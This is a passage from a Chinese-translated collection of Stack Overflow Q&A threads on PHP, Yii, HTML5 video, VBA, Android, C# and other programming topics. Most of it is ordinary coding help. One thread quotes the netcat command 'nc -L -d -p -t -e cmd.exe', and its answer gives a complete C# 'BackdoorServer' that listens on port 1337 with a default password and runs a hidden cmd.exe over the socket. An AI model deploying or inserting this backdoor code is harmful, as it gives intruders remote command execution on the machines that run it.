    $searchArray = $activeItemGroupChildren;
    $roots = array();
    foreach ($activeItemGroupChildren as $itemGroupChild) {
        $parentItemGroupID = $itemGroupChild['itemGroupID'];

        $found = array_filter($searchArray, function ($element) use ($parentItemGroupID) {
            return $element['childItemGroupID'] == $parentItemGroupID;
        });

        $rootItemGroupID = $parentItemGroupID;
        if (count($found) == 0
            && $this->_arraySearch($roots,
                function ($element) use ($rootItemGroupID) {
                    return $element['itemGroupID'] == $rootItemGroupID;
                }) === false) {

            $roots[] = $itemGroupChild;
        }
    }
    return $roots;
} 
```

但是，我现在需要使用这些信息来创建一个新的关联数组。我不知道怎么做。（我会在几分钟内发布一些作品..）

想法？

注意：假设此结构中没有递归循环，即使它们在技术上可能存在。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T17:06:55.777

如果我正确理解您的问题，这应该可以。请注意我如何在`orderMe`函数内部调用函数以使其递归。

```
function orderMe($input, $parentId)
{
    $return = array($parentId => array('itemGroupID' => $parentId));
    $childs = array();
    foreach ($input as $i)
    {
        if ($i['itemGroupID'] == $parentId)
        {
            $return[$i['itemGroupID']]['children'][$i['childItemGroupID']] = array('itemGroupID' => $i['childItemGroupID']);
            $childs[] = $i['childItemGroupID'];
        }

        if (in_array($i['childItemGroupID'], $childs))
        {
            $allChilds = orderMe($input, $i['childItemGroupID']);
            if (!empty($allChilds[$i['childItemGroupID']]['children']))
                $return[$i['itemGroupID']]['children'][$i['childItemGroupID']] =  $allChilds;
        }
    }

    return $return;
}

print_r(orderMe($input, 1)); 
```

输出：

```
array (
  1 => 
  array (
    'itemGroupID' => 1,
    'children' => 
    array (
      2 => 
      array (
        'itemGroupID' => 2,
      ),
      3 => 
      array (
        'itemGroupID' => 3,
      ),
      4 => 
      array (
        'itemGroupID' => 4,
      ),
      212 => 
      array (
        'itemGroupID' => 212,
      ),
      339 => 
      array (
        'itemGroupID' => 339,
      ),
      336 => 
      array (
        'itemGroupID' => 336,
      ),
      6 => 
      array (
        6 => 
        array (
          'itemGroupID' => 6,
          'children' => 
          array (
            8 => 
            array (
              'itemGroupID' => 8,
            ),
            9 => 
            array (
              9 => 
              array (
                'itemGroupID' => 9,
                'children' => 
                array (
                  15 => 
                  array (
                    'itemGroupID' => 15,
                  ),
                ),
              ),
            ),
            10 => 
            array (
              10 => 
              array (
                'itemGroupID' => 10,
                'children' => 
                array (
                  16 => 
                  array (
                    'itemGroupID' => 16,
                  ),
                ),
              ),
            ),
            11 => 
            array (
              11 => 
              array (
                'itemGroupID' => 11,
                'children' => 
                array (
                  17 => 
                  array (
                    'itemGroupID' => 17,
                  ),
                ),
              ),
            ),
            12 => 
            array (
              12 => 
              array (
                'itemGroupID' => 12,
                'children' => 
                array (
                  18 => 
                  array (
                    'itemGroupID' => 18,
                  ),
                ),
              ),
            ),
            13 => 
            array (
              13 => 
              array (
                'itemGroupID' => 13,
                'children' => 
                array (
                  19 => 
                  array (
                    'itemGroupID' => 19,
                  ),
                ),
              ),
            ),
            74 => 
            array (
              74 => 
              array (
                'itemGroupID' => 74,
                'children' => 
                array (
                  75 => 
                  array (
                    'itemGroupID' => 75,
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
      5 => 
      array (
        'itemGroupID' => 5,
      ),
    ),
  ),
) 
```

# html - InDesign Digital Publishing - HTML 页面以错误的大小显示

> ID：10757337
> 
> 赞同：1
> 
> 时间：2012-05-25T15:37:03.957
> 
> 标签：html, css, ipad, adobe-indesign

我正在使用 Indesign CS6 中的 HTML 设计一个 iPad 应用程序。这确实是一个相当简单的 3 列站点，带有一些 Fancybox 效果。我一直遇到的问题是，当我在 iPad 浏览器中预览该网站时，它看起来与应有的完全一样。但是，当我将 HTML 文件加载到 InDesign 并在 iPad 3 上发布/预览时，所有内容都被放大了。即使文档设置为 iPad 3 的 1536x2048 分辨率，它也像是将其视为 768x1024 分辨率。

我确实有使用 800px 容器 div 构建的网站。不过，我不确定这是否与显示问题有关。

有没有人有这样的问题的经验？我对 Adob​​e 数字出版工具还不是很熟悉，但我似乎在网上找不到任何关于此的信息。

先感谢您！

# postgresql - Yii 框架：在数据库中找不到活动记录类的表

> ID：10757346
> 
> 赞同：4
> 
> 时间：2012-05-25T15:37:58.070
> 
> 标签：postgresql, yii

我希望 hivemind 对处理来自 Yii 框架的这个错误有更多的建议。特定于我们的设置的确切错误是：

> **CDbException**在数据库中找不到活动记录类“用户”的表“用户”。

我正在使用来自 SVN 的 Yii Framework 1.1.11-dev，尽管这只是解决问题的尝试。我们正在运行最新的稳定版本 1.1.10。

我们正在尝试使用在我的开发环境中运行的代码部署到我们的实时服务器。我觉得问题几乎可以肯定是数据库配置差异，但我不确定在哪里可以找到它。

我已经在这里搜索并搜索了 Yii 论坛，在其中我发现这个问题列出了几次。我们已经尝试过的建议修复包括

*   从 dsn 中删除主机和端口
*   表名有无模式（即“users”和“public.users”）
*   将数据库 [dbname] 上的所有内容授予 postgres
*   [使用此处](http://bensbrain.blogspot.com/2004/08/postgres-grant-on-all-tables-in.html)找到的代码授予数据库中每个表的所有权限

环境如下：

*   开发 - OSX 10.7、PHP 5.3.10、PostgreSQL 9.0.3
*   产品 - FC15、PHP 5.3.10、PostgreSQL 9.0.7

该错误表明“用户”表不存在，尽管它很明显存在。

```
~$ psql -U postgres
psql (9.0.7)
Type "help" for help.

postgres=# \dt
                    List of relations
 Schema |             Name             | Type  |  Owner   
--------+------------------------------+-------+----------
  { ... removed for brevity ... }
 public | users                        | table | postgres 
```

我们在 protected/config/main.php 中的配置

```
'db'=>array(
    'connectionString' => 'pgsql:dbname=lppsync',
    'emulatePrepare' => true,
    'username' => 'postgres',
    'password' => '',
), 
```

用户模型的相关部分是

```
class Users extends CActiveRecord
{
    /**
     * Returns the static model of the specified AR class.
     * @param string $className active record class name.
     * @return Users the static model class
     */
    public static function model($className=__CLASS__)
    {
        return parent::model($className);
    }

    /**
     * @return string the associated database table name
     */
    public function tableName()
    {
        return 'users';
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T08:39:15.583

事实证明，数据没有导入命名数据库。相反，它被导入到用户的数据库中。在这种情况下，'postgres'。这种情况下的解决方法是将数据重新导入到正确的位置，或者更改 Yii 配置（我们的决定）。新的连接设置：

```
'db'=>array('connectionString' => 'pgsql:dbname=postgres', 'emulatePrepare' => true, 'username' => 'postgres','password' => '',) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-14T14:42:58.913

Yii[缓存](http://www.yiiframework.com/doc/api/1.1/CDbConnection#schemaCachingDuration-detail)数据库元数据，这可能是问题所在？尝试清除您的元数据缓存或完全禁用缓存。

/`wwwroot/assets`文件夹通常包含那些缓存文件。

还要检查您的设备（磁盘）上的空间是否不足。

来源：引用此问题的评论之一 - [Yii 框架：在数据库中找不到活动记录类的表](https://stackoverflow.com/questions/10757346/yii-framework-the-table-for-active-record-class-cannot-be-found-in-the-database#comment13982099_10757346)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T23:26:34.770

我在使用 MySQL 时遇到了类似的错误。就我而言，问题是我在授予用户权限时犯了一个错误。运行 MySQL 客户端我得到了一个正确的“命令被拒绝消息”，但从 Yii 的角度来看，这些表看起来根本不存在。

解决方案是正确授予权利：

`grant all on yiiapp.* to 'yii'@'localhost' identified by 'yii';`

# html - HTML5 Chrome 中的标签不起作用

> ID：10757347
> 
> 赞同：23
> 
> 时间：2012-05-25T15:38:00.187
> 
> 标签：html, google-chrome, video

我注意到`<video/>`Chrome 中的 HTML5 标签存在一个奇怪的问题。

使用它，它工作正常：

```
<video poster="023.png" autoplay controls>
<source src="todojunto.mp4" type="video/mp4"  />
</video> 
```

这只会播放声音，没有视频：

```
<video poster="023.png" autoplay >
<source src="todojunto.mp4" type="video/mp4"  />
</video> 
```

如果我删除该`poster`属性，它会再次起作用。

所有其他浏览器（甚至 IE9 ......！）都可以完美运行，我似乎找不到原因。

有什么想法/帮助吗？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-25T15:42:25.590

视频标签的属性应该被指定为严格的标准实现：

```
<video poster="023.png" autoplay="autoplay" controls="controls">
    <source src="todojunto.mp4" type="video/mp4"  />
</video> 
```

如果这不起作用，则您的浏览器首选项发生了变化

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T13:38:31.960

我很惊讶你的视频竟然出现了。Chrome 停止支持 mp4。使用 Chrome 处理 html5 视频时，您应该使用 .webm 文件。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-06-01T15:00:46.053

> 你需要使用`muted=""`; 它确实适用于视频

```
<div class="wrap">
	<video width="auto" height="400px" autoplay="" loop="" muted="">
   	   <source src="Video.mp4"  type="video/mp4">
	   <source src="Video.ogg" type="video/ogg">
	</video>
</div>
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-03T10:30:30.887

我遇到了同样的错误。我通过添加 preload="auto" 标签来修复它。

```
<video autoplay loop preload="auto" poster="023.png">
    <source src="todojunto.mp4" type="video/mp4" />
</video> 
```

不知道这是否对你有用，而且你问这个问题已经有一段时间了。但也许这会在未来帮助某人！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-06T19:33:04.453

我刚刚将它转换为 ogv 并在所有浏览器中运行良好。我有Firefox的问题，但没有问题了。它也显示出灰色背景，但现在，现在不再了。这是我的代码：您可以在 eargo.com/products 中看到它

```
<video class="" style="" autoplay loop>
            <source class="" src="video.ogv" >
            <source class="" src="video.mov" >
            <source class="" src="video.mp4" >
</video> 
```

您可能会在 2015 年 5 月 7 日之后看到它。

# vba - 在 Excel 中使用 VBA 按索引选择字典项#

> ID：10757350
> 
> 赞同：5
> 
> 时间：2012-05-25T15:38:23.093
> 
> 标签：vba, collections, dictionary

我正在尝试使用字典中的最后一项加载组合框。我正在尝试做这样的事情`ComboBox1.Value = NodeColl.Item(NodeColl.Count)`来处理集合，但是在使用字典时会做一些奇怪的事情。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-25T15:51:25.097

行为是不同的，因为字典允许数字键。

调用`.Item`实际上*添加了*一个带有给定键的项目；

```
NodeColl.Item(NodeColl.Count) 
```

添加一个没有值的新项目和一个与计数对应的键。

访问序数项目使用`.Items`（这是项目的数组）

```
firstItem = NodeColl.Items(0)
lastItem  = NodeColl.Items(NodeColl.Count - 1) 
```

# objective-c - 在 for 循环中访问许多 UIImageView

> ID：10757354
> 
> 赞同：0
> 
> 时间：2012-05-25T15:38:30.550
> 
> 标签：objective-c, ios, for-loop, uiimageview

我在一个 UIView 中有 5 个 UIImageView，我将 UIImageView 命名如下：

```
@property (retain, nonatomic) IBOutlet UIImageView *imgPic1;
@property (retain, nonatomic) IBOutlet UIImageView *imgPic2;
@property (retain, nonatomic) IBOutlet UIImageView *imgPic3;
@property (retain, nonatomic) IBOutlet UIImageView *imgPic4;
@property (retain, nonatomic) IBOutlet UIImageView *imgPic5; 
```

假设所有 UIImageView 都填充了图像，并且用户可以在运行时删除任何 UIImageView，我想知道如何实现以下场景？

我想要一个智能循环，所以如果用户删除**imgPic3**，**imgPic4**图像将移动到**imgPic3**，**imgPic5**将移动到**imgPic4**，**imgPic5**分配给 nil

```
imgPic3.img = imgPic4.img;
imgPic4.img = imgPic5.img;
imgPic5.img = nil; 
```

如果被删除，我可以为每个 UIImageView 硬编码 5 个逻辑场景，但我想以一种智能的方式进行操作，这样即使我有 100 个 UIImageView 也能正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:01:22.767

使用 an`NSMutableArray`来包含 5 个`UIImageView`指针。然后当图像视图 x 被删除时，执行：

```
for (int i = imgViewNumber; i < [myImageViewArray count]-1; i++) {
    [[myImageViewArray objectAtIndex:i] setImage:[[myImageViewArray objectAtIndex:i+1] image]];
}
[[myImageViewArray lastObject] setImage:nil]; 
```

编辑：
要将您`UIImageView`的 s 添加到数组中：

1.  不要将每一个都定义为属性或 iVar - 只有数组的保留属性。
2.  使用`for (int i = 0; i < numImageViews; i++)`循环添加所有图像视图，并在调用的同时`addSubview:`调用`[myImageViewArray addObject:imageView]`。
3.  然后，如果您想为特定的图像视图设置图像，请调用`[[myImageViewArray objectAtIndex:imageViewNumber] setImage:image]`（请记住，对于图像视图 1，imageViewNumber 应该为 0）

希望这现在很清楚

# mysql - mysql pdo 获取行的范围

> ID：10757359
> 
> 赞同：0
> 
> 时间：2012-05-25T15:38:46.817
> 
> 标签：mysql, database

我有一个大约 100 行的表，我希望每次都得到数字和数字之间的行，就像这样

如果`i=1`我想得到行`0 1 2 3 4`

如果`i=2`我想得到行`5 6 7 8 9`

如果`i=3`我想得到行`10 11 12 13 14`

也许我的最后一个值只需要 3 或 4 行而不是 5 我认为解决方案将是这样的

```
select * from question limit (i-1)*5 , i*5-1 
```

但不起作用，因为我不知道如何在查询中使用变量，当我尝试 i=1 时它不起作用并且出现语法错误

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:42:46.430

第一个参数`LIMIT`是从零开始的行索引。第二个是行数。因此，如果您一直在寻找五行：

```
SELECT * FROM question LIMIT (i-1)*5 , 5 
```

（您必须`(i-1)*5`使用用于构建查询的任何语言进行计算，并将实际数字传递给 MySQL）。

# android - 已建立的连接被主机中的软件中止（VS 开发服务器）

> ID：10757363
> 
> 赞同：0
> 
> 时间：2012-05-25T15:39:06.977
> 
> 标签：android, asp.net, eclipse, visual-studio, android-emulator

我看过关于这个问题的类似帖子，但没有一篇与使用 Visual Studio 开发服务器 for ASP .NET 相关。

我收到以下错误。

**已建立的连接被主机中的软件中止**。

我正在执行以下代码：

```
String employeesJson = client.downloadString("http://localhost:60000/Api/Employee/GetEmployees.aspx"); 
```

当我在常规网络浏览器（Chrome 21 或 Internet Explorer 10）中运行它时，它运行得很好。我得到了我想要的 JSON 结果。

我`WebClient`正在使用的类（在变量“ `client`”下）定义如下。

```
public class WebClient {

    private HttpClient httpClient;

    public WebClient() {

        httpClient = new DefaultHttpClient();

    }

    public String downloadString(String url) throws IOException {

        HttpGet get = new HttpGet(url);

        try {

            HttpResponse response = httpClient.execute(get); //this is where the error occurs.
            HttpEntity entity = response.getEntity();
            if(entity != null) {

                InputStream stream = entity.getContent();
                InputStreamReader streamReader = new InputStreamReader(stream);

                BufferedReader bufferedReader = new BufferedReader(streamReader);
                StringBuilder builder = new StringBuilder();

                String line = null;
                try {
                    while ((line = bufferedReader.readLine()) != null) {
                        builder.append(line + "\n");
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        stream.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                return builder.toString();

            }

        //catch all the types of exceptions this method can throw. catching "Exception" is considered bad.
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        }

        return null;

    }

} 
```

我的 AndroidManifest.xml 文件如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="specialisering.android"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="15" />
    <uses-permission android:name="android.permission.INTERNET"></uses-permission>
    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:name=".MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T11:13:43.167

面临同样的问题，是防火墙阻止它....所以关闭了防火墙，它现在可以工作了...... :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-31T10:33:05.763

我不敢相信我没有从文档中寻求答案。它明确指出 127.0.0.1 是模拟器本身的 IP，而 10.0.2.2 是开发者机器的 IP。

从 localhost 更改为 10.0.2.2 解决了我的问题。

# .net - 放置控件时增加窗体两侧的自动对齐边距

> ID：10757364
> 
> 赞同：0
> 
> 时间：2012-05-25T15:39:12.827
> 
> 标签：.net, winforms

在表单上放置控件时，ide 通过在有意义的地方自动捕捉来提供帮助。对于我正在处理的某个项目，我想稍微增加到表单两侧的自动捕捉距离。有没有办法在表单级别执行此操作（即不是每个控件，因为这会破坏目的）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:12:57.083

是的，增加表单的 Padding 属性。

# php - 使用 codeigniter 上传一些 mp4 的问题

> ID：10757366
> 
> 赞同：0
> 
> 时间：2012-05-25T15:39:25.610
> 
> 标签：php, codeigniter, video, file-upload

我有一个网站，用户可以上传视频。我一直遇到一些 mp4 无法上传的问题。特别是来自Android手机的那些。我可以很好地上传大多数 mp4，但是设备以某种方式编码的格式会拒绝它们。

任何人都知道这是为什么或修复它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T19:42:40.403

CodeIgniter 不会将该`mp4`文件识别为有效文件，因为 .mp4 不是可接受的 mime 类型的默认数组的一部分。

将此条目添加到您的`config/mimes.php`：

```
'mp4'   =>  'video/mp4', 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T23:58:22.910

为了解决我遇到的问题，我将其更改为`'mp4' => array('video/mp4', 'video/3gpp'),`现在它可以工作了。不确定这是否是最好的方法。

# android - 布局在 onTouch() 中不起作用

> ID：10757367
> 
> 赞同：0
> 
> 时间：2012-05-25T15:39:28.677
> 
> 标签：android, android-layout, android-linearlayout

我正在创建一个带有两个 ImageView 的 Activity。

第一个 ImageView 在启动时占据屏幕的一部分，我想显示另一个 ImageView，其内容是在我触摸第一个 Image 的区域及其顶部的裁剪区域。

班级：

```
public class DetectEyesActivity extends Activity  implements OnTouchListener {  
private ImageView imgView;
private Bitmap imgBitmap;

private ImageView touchView2;
private Bitmap temp;

@Override
public void onCreate(Bundle savedInstanceState) {
    setContentView(R.layout.detecteyeslayout);

    Intent intent = this.getIntent();
    byte[] image = intent.getByteArrayExtra("Image");

    imgView = (ImageView) findViewById(R.id.detectImageView1);
    touchView2 = (ImageView) findViewById(R.id.detectImageView2);

    imgBitmap = BitmapFactory.decodeByteArray(image, 0, image.length);
    imgView.setImageBitmap(imgBitmap);   

    temp = Bitmap.createBitmap(imgBitmap, 200, 200, 200, 200);
    //touchView2.setImageBitmap(temp);

    imgView.setOnTouchListener(this);
}

@Override
public boolean onTouch(View v, MotionEvent event) {
    int y = (int)event.getY();
    int x = (int)event.getX();

    temp = Bitmap.createBitmap(imgBitmap, 200,200, 200, 200);
    touchView2.setImageBitmap(temp);
    touchView2.setVisibility(0);
    touchView2.bringToFront();
    touchView2.layout(x-200, y-200, x-30, y-30);

    return true;
} 
```

}

布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/detectImageView1"
        android:layout_width="400dp"
        android:layout_height="400dp" />

    <ImageView
        android:id="@+id/detectImageView2"
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:visibility="gone" />
</LinearLayout> 
```

但是当我打电话

```
touchView2.setImageBitmap(temp); 
```

在 onTouch() 中，视图被绘制在布局上的初始图像下方。但是如果我在 onCreate() 中调用它，它会被绘制在初始图像之上吗？

为什么会发生这种情况，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T17:10:50.800

据我了解您的问题，您希望将一张图像叠加在另一张图像上。LinearLayouts 以水平或垂直线显示其子级。对于您的情况，这不是一个很好的 ViewGroup，因为它不允许多个子项占用相同的空间。我会尝试相对或框架布局。

此外，您将第二个图像的可见性设置为`gone`最初，因此不是第一个图像被绘制在它上面，而是第二个图像根本没有被绘制，直到您调用`setVisibility`onTouch。

# oracle - 从现有的 Oracle 模式生成表关系图

> ID：10757370
> 
> 赞同：2
> 
> 时间：2012-05-25T15:39:45.540
> 
> 标签：oracle, database-schema, table-relationships

我的公司有一个现有的数据库，其中包含数十个具有各种关系的数据库表。

是否有任何可用的工具可以生成关系图？

顺便说一下，我主要在 Ubuntu 11.10 机器上使用 SQL Developer 3.0.4。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:50:47.440

[SQL Developer Data Modeller](http://www.oracle.com/technetwork/developer-tools/datamodeler/overview/index.html)可以对数据库模式进行逆向工程并使用外键启动 ERD。显然，一旦完成初始导入，就需要进行一些手动工作，以生成美观且有意义的图表。

由于您已经安装了 SQL Developer，您可以从`File->Data Modeller->Import->Data Dictionary`.

# c# - 编写具有远程 shell 功能的程序，如 netcat

> ID：10757376
> 
> 赞同：3
> 
> 时间：2012-05-25T15:39:55.920
> 
> 标签：c#, shell

我有兴趣编写一个可以执行 netcats "nc -L -d -p -t -e cmd.exe" 命令之类的程序。所以它提供了一个远程shell。我已经尝试过管道输出和输入到 cmd.exe 并通过套接字发送和接收它，但它似乎并不能很好地工作。还有其他方法吗？顺便说一句，我正在用 C# 编程。

这是我编写的一些测试代码，用于测试我是否可以制作自己的“shell”。它的输出是应该通过套接字发送的。但是，当需要读取输出时，程序会停止。这只能通过使用 .readline() 方法来解决，但我不知道如何检测它何时不应再读取行。

```
 Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.Start();
        StreamReader sr = p.StandardOutput;
        StreamWriter sw = p.StandardInput;

        while (true)
        {
            Console.Write(">> ");
            string cmd = Console.ReadLine();
            sw.WriteLine(cmd);
            var resp = sr.ReadLine(); 
            Console.WriteLine(resp);
        } 
```

谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-09T07:04:19.097

不确定您是否仍然关心这一点，但这可能会对您有所帮助：

这是一个 C# 远程 Shell

```
/*****************************************************************
* 
*  Created By DT
*  
* ***************************************************************/

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace BackdoorServer
{
public class Backdoor
{
    private TcpListener listener;                       //ServerSocket object for listening
    private Socket mainSocket;                          //Socket to handle client-server communication
    private int port;                                   //Port the server listens on
    private String name;                                //The server name
    private String password;                            //The server password
    private bool verbose = true;                        //Displays messages in console if True
    private Process shell;                              //The shell process
    private StreamReader fromShell;
    private StreamWriter toShell;
    private StreamReader inStream;
    private StreamWriter outStream;
    private Thread shellThread;                         //So we can destroy the Thread when the client disconnects

    private static int DEFAULT_PORT = 1337;             //Default port to listen on if one isn't declared
    private static String DEFAULT_NAME = "Server";      //Default name of server if one isn't declared
    private static String DEFAULT_PASS = "password";    //Default server password if one isn't declared

    public Backdoor()
    {                                   //Use default settings
        port = DEFAULT_PORT;
        name = DEFAULT_NAME;
        password = DEFAULT_PASS;
    }

    public Backdoor(int p)
    {                           //Define port only
        port = p;
        name = DEFAULT_NAME;
        password = DEFAULT_PASS;
    }

    public Backdoor(int p, String n)
    {                   //Define port and server name
        port = p;
        name = n;
        password = DEFAULT_PASS;
    }

    public Backdoor(int p, String n, String pass)
    {       //Define port, server name, and password
        port = p;
        name = n;
        password = pass;
    }
    public Backdoor(int p, String n, String pass, bool verb)
    {       //Define port, server name, and password
        port = p;
        name = n;
        password = pass;
        verbose = verb;
    }
    ////////////////////////////////////////////////////////////////////////
    //the startServer method waits for a connection, checks the password,
    //and either drops the client or starts a remote shell
    ////////////////////////////////////////////////////////////////////////
    public void startServer() {
        try {
            if(verbose)
                Console.WriteLine("Listening on port " + port);

                                                                //Create the ServerSocket
            listener = new TcpListener(port);
            listener.Start();                                   //Stop and wait for a connection
            mainSocket = listener.AcceptSocket();

            if(verbose)
                Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);

            Stream s = new NetworkStream(mainSocket);
            inStream = new StreamReader(s);
            outStream = new StreamWriter(s);
            outStream.AutoFlush = true;

            String checkPass = inStream.ReadLine();

            if(verbose)
                Console.WriteLine("Client tried password " + checkPass);

            if(!checkPass.Equals(password)) {                       //if the password is not correct
                if(verbose)
                    Console.WriteLine("Incorrect Password");
                badPass();                                          //Drop the client
                return;
            }

            if(verbose)
                Console.WriteLine("Password Accepted.");

            shell = new Process();
            ProcessStartInfo p = new ProcessStartInfo("cmd");
            p.CreateNoWindow = true;
            p.UseShellExecute = false;
            p.RedirectStandardError = true;
            p.RedirectStandardInput = true;
            p.RedirectStandardOutput = true;
            shell.StartInfo = p;
            shell.Start();
            toShell = shell.StandardInput;
            fromShell = shell.StandardOutput;
            toShell.AutoFlush = true;
            shellThread = new Thread(new ThreadStart(getShellInput));   //Start a thread to read output from the shell
            shellThread.Start();
            outStream.WriteLine("Welcome to " + name + " backdoor server.");        //Display a welcome message to the client
            outStream.WriteLine("Starting shell...\n");
            getInput();                                                 //Prepare to monitor client input...
            dropConnection();                                   //When getInput() is terminated the program will come back here

        }
        catch(Exception) { dropConnection(); }
    }
    //////////////////////////////////////////////////////////////////////////////////////////////
    //The run method handles shell output in a seperate thread
    //////////////////////////////////////////////////////////////////////////////////////////////

    void getShellInput()
    {
        try
        {
            String tempBuf = "";
            outStream.WriteLine("\r\n");
            while ((tempBuf = fromShell.ReadLine()) != null)
            {
                outStream.WriteLine(tempBuf + "\r");
            }
            dropConnection();
        }
        catch (Exception) { /*dropConnection();*/ }
    }

    private void getInput() {
        try {
            String tempBuff = "";                                       //Prepare a string to hold client commands
            while(((tempBuff = inStream.ReadLine()) != null)) {         //While the buffer is not null
                if(verbose)
                    Console.WriteLine("Received command: " + tempBuff);
                handleCommand(tempBuff);                                //Handle the client's commands
            }
        }
        catch(Exception) {}
    }

    private void handleCommand(String com) {        //Here we can catch commands before they are sent
        try {                                       //to the shell, so we could write our own if we want
            if(com.Equals("exit")) {                //In this case I catch the 'exit' command and use it
                outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                dropConnection();                   //to drop the connection
            }
            toShell.WriteLine(com + "\r\n");
        }
        catch(Exception) { dropConnection(); }
    }

    ////////////////////////////////////////////////////////////////////
    //The drop connection method closes all connections and
    //resets the objects to their null states to be created again
    //I don't know if this is the best way to do it but it seems to
    //work without issue.
    ////////////////////////////////////////////////////////////////////
    private void badPass()
    {
        inStream.Dispose();
        outStream.Dispose();
        mainSocket.Close();
        listener.Stop();
        return;
    }
    private void dropConnection() {
        try {
            if(verbose)
                Console.WriteLine("Dropping Connection");
            shell.Close();
            shell.Dispose();
            shellThread.Abort();
            shellThread = null;
            inStream.Dispose();                                 //Close everything...
            outStream.Dispose();
            toShell.Dispose();
            fromShell.Dispose();
            shell.Dispose();
            mainSocket.Close();
            listener.Stop();
            return;
        }
        catch(Exception) {}
    }
    static void Main(string[] args)
    {
        try {
            Backdoor bd = new Backdoor();
            if (args.Length == 1)
                bd = new Backdoor(int.Parse(args[0]));
            if (args.Length == 2)
                bd = new Backdoor(int.Parse(args[0]), args[1]);
            if (args.Length == 3)
                bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
            else if (args.Length == 4)
                bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
            while (true)
            {
                bd.startServer();
            }
        }
        catch(Exception) {}

    }
}
} 
```

# c# - 如何在 C# 中创建一个真正不可变的双向链表？

> ID：10757378
> 
> 赞同：6
> 
> 时间：2012-05-25T15:40:06.787
> 
> 标签：c#, data-structures, language-features

这更像是一个理论问题：在 C# 中是否可以通过任何方式创建一个真正不可变的双向链表？我看到的一个问题是两个相邻节点的相互依赖。

“真正”是指使用只读字段。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-25T15:45:36.643

这可能与棘手的构造函数逻辑有关。例如

```
public sealed class Node<T> { 
  readonly T m_data;
  readonly Node<T> m_prev;
  readonly Node<T> m_next;

  // Data, Next, Prev accessors omitted for brevity      

  public Node(T data, Node<T> prev, IEnumerator<T> rest) { 
    m_data = data;
    m_prev = prev;
    if (rest.MoveNext()) {
      m_next = new Node(rest.Current, this, rest);
    }
  }
}

public static class Node {    
  public static Node<T> Create<T>(IEnumerable<T> enumerable) {
    using (var enumerator = enumerable.GetEnumerator()) {
      if (!enumerator.MoveNext()) {
        return null;
      }
      return new Node(enumerator.Current, null, enumerator);
    }
  }
}

Node<string> list = Node.Create(new [] { "a", "b", "c", "d" }); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-25T16:50:10.483

你激起了我的好奇心。ReadOnlyNode 的类很简单，可以定义：

```
public class ReadOnlyNode<T>
{
   public readonly T Value;
   public readonly ReadOnlyNode<T> Next;
   public readonly ReadOnlyNode<T> Prev;

   public Node(T value, ReadOnlyNode<T> next, ReadOnlyNode<T> prev)
   {
      Value = value;
      Next = next;
      Prev = prev;
   }
} 
```

`readonly`双向链表的问题在于，对于每个节点，您必须在构造函数中指定该节点的前一个和下一个节点，因此如果它们是从构造函数外部传递的，它们必须已经存在。但是，当您调用构造函数时，节点 M 需要一个预先存在的节点 N 作为其“下一个”节点，但该节点 N 需要 M 作为其“上一个”节点才能被构造。这会产生“鸡和蛋”的情况，其中 N 和 M 都需要首先实例化另一个节点。

然而，给这只猫剥皮的方法不止一种。如果列表的每个节点都是从一个 ReadOnlyNode 的构造函数中递归实例化的会怎样？在每个构造函数完成之前，每个级别的属性仍然是可变的，并且对每个节点的引用将存在于其构造函数中，因此在所有内容都设置好之前没有设置所有内容并不重要。下面的代码编译，给定一个预先存在的 IEnumerable 将产生一个不可变的双向链表：

```
public class ReadOnlyNode<T>
{
    public readonly T Value;
    public readonly ReadOnlyNode<T> Next;
    public readonly ReadOnlyNode<T> Prev;

    private ReadOnlyNode(IEnumerable<T> elements, ReadOnlyNode<T> prev)
    {
        if(elements == null || !elements.Any()) 
           throw new ArgumentException(
